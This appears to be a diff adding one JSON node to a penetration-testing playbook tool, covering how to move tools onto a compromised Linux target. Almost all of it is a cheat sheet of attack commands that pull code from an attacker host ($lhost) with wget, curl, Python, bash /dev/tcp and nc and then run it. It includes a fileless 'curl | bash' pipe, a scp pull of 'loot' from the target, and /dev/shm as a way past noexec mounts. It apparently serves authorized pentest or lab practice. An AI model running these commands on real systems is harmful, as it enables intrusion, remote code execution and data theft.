@@ -1,0 +1,22 @@
+{
+  "id": "transfer_linux",
+  "phase": "SHELL",
+  "title": "File Transfer — Linux (Download Tools)",
+  "body": "Get tools onto a Linux target. wget is usually available. curl as fallback. nc/base64 when nothing else works.",
+  "cmd": "# ── WGET ─────────────────────────────────────────────\nwget http://$lhost/linpeas.sh -O /tmp/lp.sh\nwget -q http://$lhost/linpeas.sh -O /tmp/lp.sh     # quiet\nwget -c http://$lhost/bigfile -O /tmp/file           # resume\nwget --no-check-certificate https://$lhost/file -O /tmp/file  # ignore SSL\nchmod +x /tmp/lp.sh && /tmp/lp.sh\n\n# ── CURL ─────────────────────────────────────────────\ncurl http://$lhost/linpeas.sh -o /tmp/lp.sh\ncurl -k https://$lhost/linpeas.sh -o /tmp/lp.sh     # ignore SSL\nchmod +x /tmp/lp.sh\n\n# Fileless — run in memory (never touches disk)\ncurl http://$lhost/linpeas.sh | bash\ncurl http://$lhost/linpeas.sh | sh\n\n# ── SCP ───────────────────────────────────────────────\n# Push from Kali to target (if SSH available)\nscp linpeas.sh user@$ip:/tmp/lp.sh\nscp -r tools/ user@$ip:/tmp/tools/\n\n# Pull from target to Kali\nscp user@$ip:/tmp/loot.txt ~/loot.txt\n\n# ── PYTHON ───────────────────────────────────────────\npython3 -c \"import urllib.request; urllib.request.urlretrieve('http://$lhost/lp.sh', '/tmp/lp.sh')\"\npython2 -c \"import urllib; urllib.urlretrieve('http://$lhost/lp.sh', '/tmp/lp.sh')\"\n\n# ── BASH /DEV/TCP (no tools available) ───────────────\nbash -c \"exec 3<>/dev/tcp/$lhost/80; echo -e 'GET /lp.sh HTTP/1.0\r\n\r\n' >&3; cat <&3\" > /tmp/lp.sh\n\n# ── NC ────────────────────────────────────────────────\n# Attacker: nc -nlvp 4444 < linpeas.sh\nnc $lhost 4444 > /tmp/lp.sh\nchmod +x /tmp/lp.sh\n\n# ── WRITABLE DIRS ────────────────────────────────────\n# Always try these if /tmp is noexec\n/tmp/          # default\n/dev/shm/      # RAM-based, fast, often overlooked\n/var/tmp/      # persists across reboots\n/run/          # tmpfs on modern Linux\ncd /dev/shm && wget http://$lhost/lp.sh -O lp.sh && chmod +x lp.sh && ./lp.sh",
+  "warn": "If /tmp is mounted noexec, use /dev/shm or /var/tmp. Always chmod +x after download. If the file runs but does nothing, check if it downloaded completely — partial downloads are silent failures.",
+  "choices": [
+    {
+      "label": "Exfiltrate data back to Kali",
+      "next": "transfer_exfil"
+    },
+    {
+      "label": "Tools on box — start Linux privesc",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Windows transfer instead",
+      "next": "transfer_windows"
+    }
+  ]
+}
